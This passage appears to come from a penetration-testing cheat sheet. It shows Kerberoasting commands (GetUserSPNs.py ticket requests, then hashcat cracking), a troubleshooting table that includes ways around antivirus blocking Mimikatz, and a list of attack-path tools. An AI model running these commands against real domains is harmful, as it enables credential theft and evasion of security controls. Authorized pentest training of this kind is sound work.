# Example 2: Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
| Kerberoasting returns no hashes | Check for service accounts with SPNs |
| Token impersonation fails | Verify SeImpersonatePrivilege is present |
| NFS mount fails | Check NFS version compatibility (vers=2,3,4) |

---

## Additional Resources

For detailed enumeration scripts, use:
- **LinPEAS**: Linux privilege escalation enumeration
- **WinPEAS**: Windows privilege escalation enumeration
- **BloodHound**: Active Directory attack path mapping
- **GTFOBins**: Unix binary exploitation reference